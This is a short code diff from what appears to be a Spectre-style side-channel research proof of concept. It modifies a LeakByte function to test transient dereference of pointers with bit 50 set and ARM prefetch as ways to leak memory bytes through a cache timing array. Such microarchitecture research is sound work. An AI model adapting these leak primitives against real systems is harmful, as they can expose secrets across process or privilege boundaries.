@@ -78,8 +78,19 @@ static char LeakByte(const char *data, size_t offset) {
         // nosajmik: during training runs, this is data[local_offset].
         // On test run, the data pointer is added with local_offset but then bit 50
         // is also set. The resulting pointer is transiently dereferenced.
+
+        // // Transient deref of the correct pointer but with bit 50 set works.
+        // ForceRead(&timing_array[data[local_offset]] + !static_cast<bool>((i + 1) % 2048) * (1ULL << 50));
+
+        // // Prefetch also ignores the non-canonical bits.
+        // const void *ptr = &timing_array[data[local_offset]] + (1ULL << 50);
+        // asm volatile("prfm pldl1keep, [%0]" :: "r" (ptr) : "memory");
+
+        // However, it doesn't seem like speculative execution can continue subsequently.
         char index = *(data + local_offset + !static_cast<bool>((i + 1) % 2048) * (1ULL << 50));
         ForceRead(&timing_array[index]);
+
+        // // Below is plain old spectre-v1.
         // ForceRead(&timing_array[data[local_offset]]);
       }
     }
